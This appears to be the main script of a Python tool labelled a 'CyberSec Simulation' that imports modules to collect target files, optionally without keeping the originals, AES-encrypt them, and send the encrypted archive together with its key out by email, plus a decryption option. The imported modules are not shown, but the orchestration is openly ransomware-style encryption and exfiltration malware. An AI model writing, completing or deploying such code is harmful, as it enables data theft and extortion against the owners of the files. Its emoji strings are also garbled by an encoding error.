# main.py
import os
from collector_module import collect_target_files
from encryptor_module import encrypt_folder
from exfiltrator_module import send_exfiltration
from decryptor_module import decrypt_archive

def main():
    print("\nüìÅ [CyberSec Simulation]")
    print("[1] Encrypt & Exfiltrate Files")
    print("[2] Decrypt Encrypted Archive")
    choice = input("Select [1/2]: ").strip()

    if choice == '1':
        # Step 1: ask how to collect
        mode = input("Keep originals? [y/N]: ").strip().lower()
        copy_mode = (mode == 'y')
        collect_target_files(copy_mode=copy_mode)

        # Step 2: encrypt folder ‚Üí returns (encrypted_path, key_bytes)
        enc_path, key = encrypt_folder()

        # Step 3: exfil via email (sends FILE.LOG + key)
        send_exfiltration("Encrypted Files", enc_path, key)

    elif choice == '2':
        # ask for inputs
        enc_path = input("Enter path to encrypted archive: ").strip()
        key_hex  = input("Enter AES key (hex): ").strip()
        decrypt_archive(enc_path, key_hex)

    else:
        print("‚ö†Ô∏è Invalid choice")

if __name__ == "__main__":
    main()
